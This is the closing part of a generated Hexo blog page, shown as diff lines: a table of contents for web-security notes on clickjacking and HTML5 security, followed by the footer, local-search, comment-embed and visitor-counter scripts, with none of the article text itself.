class="nav-text">Token的使用原则</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#点击劫持（ClickJacking）"><span class="nav-number">5.</span> <span class="nav-text">点击劫持（ClickJacking）</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是点击劫持"><span class="nav-number">5.1.</span> <span class="nav-text">什么是点击劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Flash点击劫持"><span class="nav-number">5.2.</span> <span class="nav-text">Flash点击劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#图片覆盖攻击"><span class="nav-number">5.3.</span> <span class="nav-text">图片覆盖攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#拖拽劫持与数据窃取"><span class="nav-number">5.4.</span> <span class="nav-text">拖拽劫持与数据窃取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ClickJacking3-0：触屏劫持"><span class="nav-number">5.5.</span> <span class="nav-text">ClickJacking3.0：触屏劫持</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防御ClickJacking"><span class="nav-number">5.6.</span> <span class="nav-text">防御ClickJacking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#frame-busting"><span class="nav-number">5.6.1.</span> <span class="nav-text">frame busting</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#X-Frame-Options"><span class="nav-number">5.6.2.</span> <span class="nav-text">X-Frame-Options</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#小结"><span class="nav-number">5.7.</span> <span class="nav-text">小结</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#HTML5安全"><span class="nav-number">6.</span> <span class="nav-text">HTML5安全</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#HTML5新标签"><span class="nav-number">6.1.</span> <span class="nav-text">HTML5新标签</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#iframe的sandbox"><span class="nav-number">6.2.</span> <span class="nav-text">iframe的sandbox</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Link-Types-noreferrer"><span class="nav-number">6.3.</span> <span class="nav-text">Link Types: noreferrer</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Canvas的妙用"><span class="nav-number">6.4.</span> <span class="nav-text">Canvas的妙用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他安全问题"><span class="nav-number">6.5.</span> <span class="nav-text">其他安全问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Cross-Origin-Resource-Sharing"><span class="nav-number">6.6.</span> <span class="nav-text">Cross-Origin Resource Sharing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#postMessage——跨窗口传递消息"><span class="nav-number">6.7.</span> <span class="nav-text">postMessage——跨窗口传递消息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Web-Storage"><span class="nav-number">6.8.</span> <span class="nav-text">Web Storage</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    by
+  </span>
+  <span class="author" itemprop="copyrightHolder">小光</span>
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
+  <script>AV.initialize("rXDtthwfyBtPIDbpKrjcpxmS-gzGzoHsz", "5fvqAap2dh7V6AXxOQgVSqSU");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  <script>
+    $('.blur-bg').css('height', $(document).height() + 130);
+    var blogClearTimer = setInterval(function () {
+      if (!(localStorage.getItem('mfaying') === 'blog')) {
+        window.document.write("");
+      } else {
+        clearInterval(blogClearTimer);
+      }
+    }, 500);
+  </script>
+</body>
+</html>
